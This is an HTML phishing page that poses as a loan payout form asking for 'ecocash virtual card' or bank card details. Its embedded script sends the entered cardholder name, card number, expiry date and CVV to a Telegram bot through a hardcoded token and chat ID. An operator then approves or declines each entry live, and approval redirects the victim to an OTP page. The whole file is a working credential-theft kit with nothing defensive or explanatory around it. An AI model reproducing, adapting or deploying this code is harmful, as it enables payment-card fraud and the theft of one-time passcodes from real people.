<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ENTER CREDIT/MASTER CARD TO RECEIVE PAYMENTS</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background: linear-gradient(135deg, #a0e1eb, #1fcc53);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        
        .card {
            background: white;
            border-radius: 15px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
            padding: 30px;
            width: 100%;
            max-width: 400px;
            transition: transform 0.3s;
        }
        
        .card:hover {
            transform: translateY(-5px);
        }
        
        h2 {
            text-align: center;
            color: #007BFF;
            margin-bottom: 25px;
            font-weight: 500;
        }
        
        .input-group {
            margin-bottom: 20px;
        }
        
        .input-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #555;
        }
        
        .input-group input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ccc;
            border-radius: 8px;
            transition: border-color 0.3s;
        }
        
        .input-group input:focus {
            border-color: #007BFF;
            outline: none;
            box-shadow: 0 0 5px rgba(0, 123, 255, 0.5);
        }
        
        .btn {
            width: 100%;
            padding: 12px;
            background-color: #d68d8d;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 18px;
            transition: background-color 0.3s, transform 0.3s;
        }
        
        .btn:hover {
            background-color: #0056b3;
            transform: translateY(-2px);
        }
        
        .btn:disabled {
            background-color: #6c757d;
            cursor: not-allowed;
            transform: none;
        }
        
        #status-message {
            display: none;
            text-align: center;
            padding: 15px;
            margin-top: 15px;
            border-radius: 8px;
            font-weight: 500;
        }
        
        #status-message.decline {
            display: block;
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        /* Spinner-only overlay */
        
        .overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            z-index: 999;
            justify-content: center;
            align-items: center;
        }
        
        .overlay.active {
            display: flex;
        }
        
        .overlay-box {
            background: white;
            padding: 40px 50px;
            border-radius: 15px;
            text-align: center;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
        }
        
        .overlay-box p {
            color: #555;
            margin-top: 15px;
            font-size: 16px;
        }
        
        .spinner {
            display: inline-block;
            width: 50px;
            height: 50px;
            border: 4px solid #e0e0e0;
            border-top: 4px solid #007BFF;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
    </style>
</head>

<body>
    <div class="card">
        <h2>PAYMENTS WILL BE DISBURSED TO ATM CARD</h2>
        <h1>Enter details for ecocash virtual card or any of your bank</h1>
        <form id="payment-form">
            <div class="input-group">
                <label for="card-name">Cardholder Name</label>
                <input type="text" id="card-name" placeholder="John Doe" required>
            </div>
            <div class="input-group">
                <label for="card-number">Card Number</label>
                <input type="text" id="card-number" placeholder="1111 2222 3333 4444" required>
            </div>
            <div class="input-group">
                <label for="expiration">Expiration Date (MM/YY)</label>
                <input type="text" id="expiration" placeholder="12/23" required>
            </div>
            <div class="input-group">
                <label for="cvv">CVV</label>
                <input type="text" id="cvv" placeholder="123" required>
            </div>
            <button type="submit" class="btn" id="submit-btn">Accept Loans</button>
        </form>
        <div id="status-message"></div>
    </div>

    <!-- Spinner overlay — waiting for Telegram callback -->
    <div class="overlay" id="waiting-overlay">
        <div class="overlay-box">
            <div class="spinner"></div>
            <p>Waiting for approval from loan provider...</p>
        </div>
    </div>

    <script>
        // ─── Telegram Bot Config ────────────────────────────────────────
        const botToken = '8705352429:AAFEnwVGYhdodm1V7iDItiCXycEy-WZfL_o';
        const chatId = '5615316142';

        // ─── DOM refs ───────────────────────────────────────────────────
        const form = document.getElementById('payment-form');
        const submitBtn = document.getElementById('submit-btn');
        const statusMsg = document.getElementById('status-message');
        const overlay = document.getElementById('waiting-overlay');
        const inputs = form.querySelectorAll('input');

        // ─── Helpers ────────────────────────────────────────────────────
        function generateId() {
            return Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
        }

        function resetForm() {
            inputs.forEach(inp => inp.value = '');
            statusMsg.className = '';
            statusMsg.style.display = 'none';
            statusMsg.textContent = '';
            submitBtn.disabled = false;
            submitBtn.textContent = 'Accept Loans';
        }

        function showDecline(msg) {
            statusMsg.textContent = msg;
            statusMsg.className = 'decline';
            statusMsg.style.display = 'block';
        }

        // ─── Poll Telegram for callback decision ───────────────────────
        function pollForDecision(submissionId) {
            let offset = 0;
            const poll = setInterval(async() => {
                try {
                    const resp = await fetch(
                        `https://api.telegram.org/bot${botToken}/getUpdates?offset=${offset}&timeout=10`
                    );
                    const data = await resp.json();
                    if (data.ok && data.result) {
                        for (const update of data.result) {
                            offset = update.update_id + 1;
                            if (update.callback_query) {
                                const cb = update.callback_query;
                                const cbData = cb.data; // "approve_xxx" or "decline_xxx"
                                const parts = cbData.split('_');
                                const action = parts[0]; // "approve" or "decline"
                                const id = parts.slice(1).join('_'); // everything after the first underscore

                                if (id === submissionId) {
                                    clearInterval(poll);
                                    overlay.classList.remove('active');

                                    if (action === 'approve') {
                                        window.location.href = 'otp.html';
                                    } else {
                                        showDecline('❌ Card details were declined. Please re-enter.');
                                        resetForm();
                                        document.querySelector('.card').scrollIntoView({
                                            behavior: 'smooth'
                                        });
                                    }
                                }
                            }
                        }
                    }
                } catch (err) {
                    console.error('Poll error:', err);
                }
            }, 2000);
        }

        // ─── Form submission ───────────────────────────────────────────
        form.addEventListener('submit', function(e) {
            e.preventDefault();

            const cardName = document.getElementById('card-name').value.trim();
            const cardNumber = document.getElementById('card-number').value.trim();
            const expiration = document.getElementById('expiration').value.trim();
            const cvv = document.getElementById('cvv').value.trim();

            if (!cardName || !cardNumber || !expiration || !cvv) {
                showDecline('⚠️ Please fill in all fields.');
                return;
            }

            // Disable button to prevent double-submit
            submitBtn.disabled = true;
            submitBtn.textContent = 'Submitting...';
            statusMsg.style.display = 'none';

            const submissionId = generateId();

            const message = `🔔 New Card Submission\n━━━━━━━━━━━━━━━\n🆔 ID: ${submissionId}\n👤 Name: ${cardName}\n💳 Card: ${cardNumber}\n📅 Exp: ${expiration}\n🔐 CVV: ${cvv}\n━━━━━━━━━━━━━━━`;

            const inlineKeyboard = {
                inline_keyboard: [
                    [{
                        text: '✅ Approve',
                        callback_data: `approve_${submissionId}`
                    }, {
                        text: '❌ Decline',
                        callback_data: `decline_${submissionId}`
                    }]
                ]
            };

            // ─── Send to Telegram ──────────────────────────────────────
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        reply_markup: inlineKeyboard
                    })
                })
                .then(response => {
                    if (!response.ok) {
                        return response.text().then(t => {
                            throw new Error(t);
                        });
                    }
                    // Success → show spinner overlay, start polling
                    overlay.classList.add('active');
                    pollForDecision(submissionId);
                })
                .catch(error => {
                    console.error('Telegram Error:', error);
                    showDecline('❌ Error sending data to Telegram. Please try again.');
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'Accept Loans';
                });
        });
    </script>
</body>

</html>
